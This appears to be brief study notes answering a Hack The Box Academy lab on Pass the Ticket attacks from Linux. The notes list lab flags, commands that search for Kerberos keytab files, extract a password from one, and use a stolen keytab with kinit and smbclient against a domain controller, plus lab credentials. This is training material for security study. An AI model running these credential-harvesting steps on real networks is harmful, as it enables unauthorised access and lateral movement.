

Pass the Ticket (PtT) from Linux
    https://academy.hackthebox.com/module/147/section/1657

    1.  Gett1ng_Acc3$$_to_LINUX01
    2.  Linux Admins
        1.  `realm list` because it is domain joined
    3.  /opt/specialfiles/carlos.keytab
        1.  find / -name *keytab* -ls 2>/dev/null
    4.  C@rl0s_1$_H3r3
        1.  python3 ./keytabextract.py /opt/specialfiles/carlos.keytab
        2.  carlos:Password5
    5.  svc_workstations
        1. ssh svc_workstations@inlanefreight.htb@localhost -p 2222
            Password5
    
Protected files
    1.  kira:L0vey0u1! is expected to be known
        1.  



kinit svc_workstations@INLANEFREIGHT.HTB -k -t /home/carlos@inlanefreight.htb/.scripts/svc_workstations._all.kt
smbclient //dc01.inlanefreight.htb/svc_workstations -c 'ls'  -k -no-pass > /home/carlos@inlanefreight.htb/script-test-results-all.txt
